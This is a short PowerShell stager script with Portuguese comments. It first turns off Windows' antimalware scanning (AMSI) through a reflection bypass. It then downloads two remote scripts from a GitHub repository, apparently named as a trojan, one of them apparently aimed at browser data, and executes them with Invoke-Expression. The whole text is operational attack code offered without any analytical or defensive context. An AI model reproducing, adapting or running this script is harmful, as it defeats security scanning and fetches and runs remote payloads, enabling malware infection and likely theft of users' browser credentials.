# Desabilita AMSI
$t=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$t.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Executa os payloads
iex (iwr 'https://raw.githubusercontent.com/gsfv/tro.j/refs/heads/main/ANDRE.ps1').Content
Start-Sleep -Seconds 3
iex (iwr 'https://raw.githubusercontent.com/gsfv/tro.j/refs/heads/main/BROWSER-ALL.ps1').Content
